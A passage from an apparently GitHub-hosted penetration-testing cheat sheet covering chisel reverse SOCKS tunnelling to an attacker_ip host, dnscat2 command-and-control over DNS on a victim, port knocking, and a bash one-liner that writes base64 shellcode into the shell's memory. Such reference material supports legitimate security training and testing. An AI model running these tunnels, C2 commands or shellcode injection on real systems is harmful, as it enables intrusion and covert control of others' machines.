class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e start reverse socks proxy server on port 8080:\u003c/span\u003e\n./chisel server -p 8000 --reverse\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e grab windows chisel.exe binary from:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e https://github.com/jpillora/chisel/releases/latest/\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on jumpbox (Windows example), set up reverse SOCKS proxy\u003c/span\u003e\n.\u003cspan class=\"pl-cce\"\u003e\\c\u003c/span\u003ehisel-x64.exe client attacker_ip:8000 R:socks\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e then use proxychains from attack box like normal\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e to do reverse port forwarding so kali can reach internal address,\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e add the following to the previous command:\u003c/span\u003e\nR:2222:VICTIM_IP:22\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e to tunnel ssh through a SOCKS proxy without proxychains:\u003c/span\u003e\nssh -o ProxyCommand=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003encat --proxy-type socks5 --proxy 127.0.0.1:8000 %h %p\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e victim@VICTIM_IP\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e8.10 Bending with \u003ccode\u003ednscat2\u003c/code\u003e\u003c/h2\u003e\u003ca id=\"user-content-810-bending-with-dnscat2\" class=\"anchor\" aria-label=\"Permalink: 8.10 Bending with dnscat2\" href=\"#810-bending-with-dnscat2\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://github.com/iagox86/dnscat2\"\u003eDnscat2\u003c/a\u003e is a tool for securely tunneling traffic through DNS queries in order to perform C2 functions on a victim. It has a server and a client binary. You run the server on a DNS nameserver you own. You run the client on a victim. Once a client establishes a session with the server, you can use a command interface on the server (kinda like msfconsole) to interact with the client. This includes setting up port forwarding rules.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# on your DNS Nameserver, start the dnscat2 server:\ndnscat2-server mydomain.com\n\n# on your victim, start the dnscat2 client\n./dnscat mydomain.com\n\n\n# on your DNS Nameserver, in the dnscat2 command shell:\n# list active sessions (windows)\ndnscat2\u0026gt; windows\n# interact with window/session 1\ndnscat2\u0026gt; window -i 1\n# get help, listing all commands\ncommand (victim01) 1\u0026gt; ? # or 'help'\n# get command help for 'listen' (sets up local fwd like ssh -L)\ncommand (victim01) 1\u0026gt; listen --help\n# start local port forwarding\ncommand (victim01) 1\u0026gt; listen 0.0.0.0:4455 VICTIM_IP:445\n# if you mess up and have to change the listening port,\n# you have to kill the client and restart it.\n# It's usually better to just pick a different listen port if you can.\n# return to main command screen\ncommand (victim01) 1\u0026gt; shutdown\n# (after restarting victim client, you can retry your port forward)\n# if you want to return to the top level command window\n# without killing the client:\ncommand (victim01) 1\u0026gt; suspend\n\n\n# on kali:\n# now you can use your newly forwarded port to reach inside the victim network:\nsmbclient -U victim --password=victimpass -p 4455 -L //NAMESERVER_IP/\n# connection will be very slow.\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on your DNS Nameserver, start the dnscat2 server:\u003c/span\u003e\ndnscat2-server mydomain.com\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on your victim, start the dnscat2 client\u003c/span\u003e\n./dnscat mydomain.com\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on your DNS Nameserver, in the dnscat2 command shell:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list active sessions (windows)\u003c/span\u003e\ndnscat\u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e windows\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e interact with window/session 1\u003c/span\u003e\ndnscat\u003cspan class=\"pl-k\"\u003e2\u0026gt;\u003c/span\u003e window -i 1\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get help, listing all commands\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003ecommand\u003c/span\u003e (victim01) \u003cspan class=\"pl-k\"\u003e1\u0026gt;\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e?\u003c/span\u003e \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e or 'help'\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e get command help for 'listen' (sets up local fwd like ssh -L)\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003ecommand\u003c/span\u003e (victim01) \u003cspan class=\"pl-k\"\u003e1\u0026gt;\u003c/span\u003e listen --help\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e start local port forwarding\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003ecommand\u003c/span\u003e (victim01) \u003cspan class=\"pl-k\"\u003e1\u0026gt;\u003c/span\u003e listen 0.0.0.0:4455 VICTIM_IP:445\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if you mess up and have to change the listening port,\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e you have to kill the client and restart it.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e It's usually better to just pick a different listen port if you can.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e return to main command screen\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003ecommand\u003c/span\u003e (victim01) \u003cspan class=\"pl-k\"\u003e1\u0026gt;\u003c/span\u003e shutdown\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e (after restarting victim client, you can retry your port forward)\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e if you want to return to the top level command window\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e without killing the client:\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003ecommand\u003c/span\u003e (victim01) \u003cspan class=\"pl-k\"\u003e1\u0026gt;\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esuspend\u003c/span\u003e\n\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on kali:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e now you can use your newly forwarded port to reach inside the victim network:\u003c/span\u003e\nsmbclient -U victim --password=victimpass -p 4455 -L //NAMESERVER_IP/\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e connection will be very slow.\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch1 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e9 Miscellaneous\u003c/h1\u003e\u003ca id=\"user-content-9-miscellaneous\" class=\"anchor\" aria-label=\"Permalink: 9 Miscellaneous\" href=\"#9-miscellaneous\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e9.1 Port Knocking\u003c/h2\u003e\u003ca id=\"user-content-91-port-knocking\" class=\"anchor\" aria-label=\"Permalink: 9.1 Port Knocking\" href=\"#91-port-knocking\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# port knock on ports 24-\u0026gt;23-\u0026gt;22 with nmap\n# \u0026quot;-r\u0026quot; forces ports to be hit in order\n# may want to add \u0026quot;--max-parallelism 1\u0026quot;\nnmap -Pn --host-timeout 201 --max-retries 0 -r -p24,23,22 $VICTIM_IP\n\n# doing the same thing with netcat\n# NOTE: netcat can only knock on sequential ports without using a for-loop\nnc -z $VICTIM_IP 22-24\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e port knock on ports 24-\u0026gt;23-\u0026gt;22 with nmap\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e \"-r\" forces ports to be hit in order\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e may want to add \"--max-parallelism 1\"\u003c/span\u003e\nnmap -Pn --host-timeout 201 --max-retries 0 -r -p24,23,22 \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e doing the same thing with netcat\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e NOTE: netcat can only knock on sequential ports without using a for-loop\u003c/span\u003e\nnc -z \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e 22-24\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIf you're able to read files on the victim, check out their \u003ccode\u003e/etc/knockd.conf\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e9.2 Convert text to Windows UTF-16 format on Linux\u003c/h2\u003e\u003ca id=\"user-content-92-convert-text-to-windows-utf-16-format-on-linux\" class=\"anchor\" aria-label=\"Permalink: 9.2 Convert text to Windows UTF-16 format on Linux\" href=\"#92-convert-text-to-windows-utf-16-format-on-linux\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# useful for encoding a powershell command in base64\necho \u0026quot;some text\u0026quot; | iconv -t UTF-16LE\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e useful for encoding a powershell command in base64\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003esome text\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e iconv -t UTF-16LE\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e9.3 Extract UDP pcap packet payload data\u003c/h2\u003e\u003ca id=\"user-content-93-extract-udp-pcap-packet-payload-data\" class=\"anchor\" aria-label=\"Permalink: 9.3 Extract UDP pcap packet payload data\" href=\"#93-extract-udp-pcap-packet-payload-data\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eUsing scapy:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-python notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"#!/usr/bin/env python3\nfrom scapy.all import *\nimport sys\n\ndef handler(packet):\n    print(str(packet.payload.payload.payload))\n\npcap = sys.argv[1]\nsniff(offline=pcap, prn=handler, filter=\u0026quot;udp\u0026quot;)\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e#!/usr/bin/env python3\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003efrom\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003escapy\u003c/span\u003e.\u003cspan class=\"pl-s1\"\u003eall\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eimport\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e*\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003eimport\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003esys\u003c/span\u003e\n\n\u003cspan class=\"pl-k\"\u003edef\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ehandler\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003epacket\u003c/span\u003e):\n    \u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e(\u003cspan class=\"pl-en\"\u003estr\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003epacket\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003epayload\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003epayload\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003epayload\u003c/span\u003e))\n\n\u003cspan class=\"pl-s1\"\u003epcap\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003esys\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003eargv\u003c/span\u003e[\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e]\n\u003cspan class=\"pl-en\"\u003esniff\u003c/span\u003e(\u003cspan class=\"pl-s1\"\u003eoffline\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003epcap\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003eprn\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003ehandler\u003c/span\u003e, \u003cspan class=\"pl-s1\"\u003efilter\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"udp\"\u003c/span\u003e)\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eUsing Tshark from the command line:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"tshark -r udp.pcap -w udp.hex -Y udp -T fields -e udp.payload | tr -d '\\n' | xxd -r -p\n# -r = input file\n# -w = output file\n# -Y = wiresark display filter\n# -T = set the output format. \u0026quot;fields\u0026quot; shows only the fileds you select with -e\n# -e = chosen fields to display with '-T fields'\n# xxd: cannot combine '-r -p' like '-rp'\"\u003e\u003cpre\u003etshark -r udp.pcap -w udp.hex -Y udp -T fields -e udp.payload \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e tr -d \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\\n\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e xxd -r -p\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -r = input file\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -w = output file\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -Y = wiresark display filter\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -T = set the output format. \"fields\" shows only the fileds you select with -e\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -e = chosen fields to display with '-T fields'\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e xxd: cannot combine '-r -p' like '-rp'\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e9.4 Execute Shellcode from Bash\u003c/h2\u003e\u003ca id=\"user-content-94-execute-shellcode-from-bash\" class=\"anchor\" aria-label=\"Permalink: 9.4 Execute Shellcode from Bash\" href=\"#94-execute-shellcode-from-bash\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"cd /proc/$$;exec 3\u0026gt;mem;echo \u0026quot;McBQaC8vc2hoL2JpbonjUFOJ4bALzYA=\u0026quot; | base64 -d | dd bs=1 seek=$(($((16#`cat maps | grep /bin/bash | cut -f1 -d- | head -n 1`)) + $((16#300e0))))\u0026gt;\u0026amp;3\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c1\"\u003ecd\u003c/span\u003e /proc/\u003cspan class=\"pl-smi\"\u003e$$\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eexec\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e3\u0026gt;\u003c/span\u003emem\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eMcBQaC8vc2hoL2JpbonjUFOJ4bALzYA=\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e base64 -d \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e dd bs=1 seek=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$((\u003c/span\u003e$((\u003cspan class=\"pl-c1\"\u003e16\u003c/span\u003e#`cat maps \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e grep \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ebin\u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ebash \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e cut \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ef\u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ed\u003cspan class=\"pl-k\"\u003e-\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e head \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003en \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e`\u003cspan class=\"pl-pds\"\u003e))\u003c/span\u003e\u003c/span\u003e + \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e$((\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e16#300e0\u003c/span\u003e\u003cspan class=\"pl-pds\"\u003e))\u003c/span\u003e\u003c/span\u003e))\u003cspan class=\"pl-k\"\u003e\u0026gt;\u0026amp;3\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eExplained:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003ecd into \u003ccode\u003e/proc/$$/\u003c/code\u003e to write to the current PID\u003c/li\u003e\n\u003cli\u003eCreate a file descriptor 3 and point it to mem so you an write to FD 3 in the procs memory.\u003c/li\u003e\n\u003cli\u003eEcho shellcode as base64 and decode it\u003c/li\u003e\n\u003cli\u003eUse \u003ccode\u003edd\u003c/code\u003e to write to your memory starting at the output of seek\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eThe line reads out the maps file showing the memory map of the bash process, then it greps for \u003ccode\u003e/bin/bash\u003c/code\u003e to find where it is loaded in memory. It gets the address with cut and head then converts it from base16 to decimal. It adds that number to \u003ccode\u003e0x300e0\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e0x300e0\u003c/code\u003e is the location of bashs exit function in memory\u003c/li\u003e\n\u003cli\u003eNet result: You overwrite bashs exit function with the shellcode\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e9.5 Encryption\u003c/h2\u003e\u003ca id=\"user-content-95-encryption\" class=\"anchor\" aria-label=\"Permalink: 9.5 Encryption\" href=\"#95-encryption\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e9.5.1 Create self-signed SSL/TLS certificate\u003c/h3\u003e\u003ca id=\"user-content-951-create-self-signed-ssltls-certificate\" class=\"anchor\" aria-label=\"Permalink: 9.5.1 Create self-signed SSL/TLS certificate\" href=\"#951-create-self-signed-ssltls-certificate\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 